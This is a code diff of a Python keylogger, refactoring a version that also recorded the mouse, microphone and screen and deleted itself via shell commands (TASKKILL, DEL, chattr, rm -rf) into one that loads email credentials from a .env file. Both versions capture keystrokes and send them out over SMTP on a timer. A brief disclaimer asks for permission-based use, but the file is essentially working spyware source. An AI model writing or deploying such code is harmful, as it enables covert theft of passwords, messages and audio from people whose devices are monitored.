@@ -1,145 +1,131 @@
-try:
-    import logging
-    import os
-    import platform
-    import smtplib
-    import socket
-    import threading
-    import wave
-    import pyscreenshot
-    import sounddevice as sd
-    from pynput import keyboard
-    from pynput.keyboard import Listener
-    from email import encoders
-    from email.mime.base import MIMEBase
-    from email.mime.multipart import MIMEMultipart
-    from email.mime.text import MIMEText
-    import glob
-except ModuleNotFoundError:
-    from subprocess import call
-    modules = ["pyscreenshot","sounddevice","pynput"]
-    call("pip install " + ' '.join(modules), shell=True)
+import os
+import logging
+import platform
+import smtplib
+import socket
+import threading
+import wave
+import pyscreenshot
+import sounddevice as sd
+from pynput import keyboard
+from pynput.keyboard import Listener
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email import encoders
+from dotenv import load_dotenv
 
+# Load environment variables from a .env file
+load_dotenv()
 
-finally:
-    EMAIL_ADDRESS = "YOUR_USERNAME"
-    EMAIL_PASSWORD = "YOUR_PASSWORD"
-    SEND_REPORT_EVERY = 60 # as in seconds
-    class KeyLogger:
-        def __init__(self, time_interval, email, password):
-            self.interval = time_interval
-            self.log = "KeyLogger Started..."
-            self.email = email
-            self.password = password
+EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
+EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
+SEND_REPORT_EVERY = 60  # in seconds
 
-        def appendlog(self, string):
-            self.log = self.log + string
+# Ensure credentials are provided
+if not EMAIL_ADDRESS or not EMAIL_PASSWORD:
+    raise ValueError("Please set EMAIL_ADDRESS and EMAIL_PASSWORD in your environment variables.")
 
-        def on_move(self, x, y):
-            current_move = logging.info("Mouse moved to {} {}".format(x, y))
-            self.appendlog(current_move)
+class KeyLogger:
+    def __init__(self, time_interval, email, password):
+        self.interval = time_interval
+        self.log = "KeyLogger Started...\n"
+        self.email = email
+        self.password = password
+        self.log_file = "keylog.txt"
 
-        def on_click(self, x, y):
-            current_click = logging.info("Mouse moved to {} {}".format(x, y))
-            self.appendlog(current_click)
+    def append_log(self, string):
+        self.log += string
 
-        def on_scroll(self, x, y):
-            current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
-            self.appendlog(current_scroll)
+    def save_log_to_file(self):
+        with open(self.log_file, "w") as file:
+            file.write(self.log)
 
-        def save_data(self, key):
-            try:
-                current_key = str(key.char)
-            except AttributeError:
-                if key == key.space:
-                    current_key = "SPACE"
-                elif key == key.esc:
-                    current_key = "ESC"
-                else:
-                    current_key = " " + str(key) + " "
+    def send_mail(self, subject, body, attachments=None):
+        try:
+            msg = MIMEMultipart()
+            msg['From'] = self.email
+            msg['To'] = self.email  # Send to yourself
+            msg['Subject'] = subject
 
-            self.appendlog(current_key)
+            msg.attach(MIMEText(body, 'plain'))
 
-        def send_mail(self, email, password, message):
-            sender = "Private Person <from@example.com>"
-            receiver = "A Test User <to@example.com>"
+            # Attach files if provided
+            if attachments:
+                for file_path in attachments:
+                    with open(file_path, "rb") as attachment:
+                        part = MIMEBase('application', 'octet-stream')
+                        part.set_payload(attachment.read())
+                        encoders.encode_base64(part)
+                        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file_path)}')
+                        msg.attach(part)
 
-            m = f"""\
-            Subject: main Mailtrap
-            To: {receiver}
-            From: {sender}
-
-            Keylogger by aydinnyunus\n"""
-
-            m += message
+            # Send email
             with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
-                server.login(email, password)
-                server.sendmail(sender, receiver, message)
+                server.login(self.email, self.password)
+                server.send_message(msg)
+        except Exception as e:
+            logging.error(f"Failed to send email: {e}")
 
-        def report(self):
-            self.send_mail(self.email, self.password, "\n\n" + self.log)
-            self.log = ""
-            timer = threading.Timer(self.interval, self.report)
-            timer.start()
+    def report(self):
+        self.save_log_to_file()
+        self.send_mail(
+            subject="KeyLogger Report",
+            body="Find the attached log file.",
+            attachments=[self.log_file]
+        )
+        self.log = ""  # Clear log after sending
+        timer = threading.Timer(self.interval, self.report)
+        timer.start()
 
-        def system_information(self):
-            hostname = socket.gethostname()
-            ip = socket.gethostbyname(hostname)
-            plat = platform.processor()
-            system = platform.system()
-            machine = platform.machine()
-            self.appendlog(hostname)
-            self.appendlog(ip)
-            self.appendlog(plat)
-            self.appendlog(system)
-            self.appendlog(machine)
-
-        def microphone(self):
-            fs = 44100
-            seconds = SEND_REPORT_EVERY
-            obj = wave.open('sound.wav', 'w')
-            obj.setnchannels(1)  # mono
-            obj.setsampwidth(2)
-            obj.setframerate(fs)
-            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
-            obj.writeframesraw(myrecording)
-            sd.wait()
-
-            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
-
-        def screenshot(self):
-            img = pyscreenshot.grab()
-            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
-
-        def run(self):
-            keyboard_listener = keyboard.Listener(on_press=self.save_data)
-            with keyboard_listener:
-                self.report()
-                keyboard_listener.join()
-            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
-                mouse_listener.join()
-            if os.name == "nt":
-                try:
-                    pwd = os.path.abspath(os.getcwd())
-                    os.system("cd " + pwd)
-                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
-                    print('File was closed.')
-                    os.system("DEL " + os.path.basename(__file__))
-                except OSError:
-                    print('File is close.')
-
+    def save_key(self, key):
+        try:
+            current_key = str(key.char)
+        except AttributeError:
+            if key == key.space:
+                current_key = "[SPACE]"
+            elif key == key.esc:
+                current_key = "[ESC]"
             else:
-                try:
-                    pwd = os.path.abspath(os.getcwd())
-                    os.system("cd " + pwd)
-                    os.system('pkill leafpad')
-                    os.system("chattr -i " +  os.path.basename(__file__))
-                    print('File was closed.')
-                    os.system("rm -rf" + os.path.basename(__file__))
-                except OSError:
-                    print('File is close.')
+                current_key = f"[{key}]"
+        self.append_log(current_key + " ")
 
+    def capture_screenshot(self):
+        try:
+            screenshot_path = "screenshot.png"
+            img = pyscreenshot.grab()
+            img.save(screenshot_path)
+            return screenshot_path
+        except Exception as e:
+            logging.error(f"Failed to capture screenshot: {e}")
+            return None
+
+    def record_microphone(self):
+        try:
+            audio_path = "recording.wav"
+            fs = 44100
+            seconds = 10  # Record for 10 seconds
+            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+            sd.wait()
+            with wave.open(audio_path, 'w') as wf:
+                wf.setnchannels(2)
+                wf.setsampwidth(2)
+                wf.setframerate(fs)
+                wf.writeframes(recording.tobytes())
+            return audio_path
+        except Exception as e:
+            logging.error(f"Failed to record audio: {e}")
+            return None
+
+    def run(self):
+        logging.info("KeyLogger is running...")
+        keyboard_listener = keyboard.Listener(on_press=self.save_key)
+        with keyboard_listener:
+            self.report()  # Start the reporting thread
+            keyboard_listener.join()
+
+# Disclaimer: Use this script only on devices you own or have explicit permission to monitor.
+if __name__ == "__main__":
+    logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")
     keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
     keylogger.run()
-
-
